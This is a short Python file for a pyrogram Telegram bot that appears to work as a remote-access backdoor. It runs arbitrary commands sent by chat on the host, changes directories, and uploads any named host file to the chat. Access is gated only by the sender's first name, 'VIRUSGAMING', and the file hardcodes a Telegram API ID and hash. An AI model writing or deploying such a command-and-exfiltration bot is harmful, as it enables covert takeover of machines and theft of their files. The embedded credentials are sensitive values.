from pyrogram import Client, filters
from utils import *

# GLOBAL VARIABLES
API_ID = 29695292
API_HASH = "8b05ce00146edeeae7aafc4bea30e713"
whait_for_filename = False
change_dir = False
# END GLOBAL VARIABLES

bot = Client("bot", API_ID, API_HASH)

@bot.on_message(filters.private)
async def on_message(client, message):
    global whait_for_filename, change_dir
    ID = message.chat.id
    rute = os.getcwd()
    msg = message.text
    user = message.from_user.first_name
    if user != "VIRUSGAMING" and CheckSecure():
        await bot.send_message(ID,"Access denied...")
        return
    if msg == "/chdir":
        await bot.send_message(ID, "enter directory name: ")
        change_dir = True
        return
    elif change_dir == True:
        change_dir = False
        msg = chdir(msg)
        await bot.send_message(ID, msg)
    elif whait_for_filename == True:
        whait_for_filename = False
        await bot.send_document(ID, msg)
    elif message.text == "/sendfile":
        await bot.send_message(ID, "send file name")
        whait_for_filename = True
    else:
        cmd = command(msg)
    try:
        await bot.send_message(ID, cmd)
    except:
        pass

bot.run()
